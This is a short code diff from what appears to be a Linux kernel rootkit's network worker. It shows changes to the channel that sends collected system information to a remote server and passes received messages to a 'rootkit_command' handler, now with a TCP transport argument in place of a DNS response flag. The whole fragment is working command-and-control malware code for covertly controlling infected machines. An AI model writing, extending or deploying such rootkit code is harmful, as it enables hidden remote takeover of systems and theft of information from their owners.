@@ -23,7 +23,7 @@ static bool send_initial_message_with_retries(void) {
     }
 
     for (int attempts = 0; attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR; attempts++) {
-        if (send_to_server(sysinfo) == SUCCESS) {
+        if (send_to_server(TCP, sysinfo) == SUCCESS) {
             kfree(sysinfo);
             return true;
         }
@@ -54,13 +54,10 @@ static bool receive_loop(char *recv_buffer) {
         }
 
         failure_count = empty_count = 0;
-
-        // print the received message
+        
         DBG_MSG("network_worker: received message: %s\n", recv_buffer);
-
         if (strcmp(recv_buffer, "\n") != 0) {
-            response_over_dns = false;
-            rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
+            rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE, TCP);
         }
     }
 
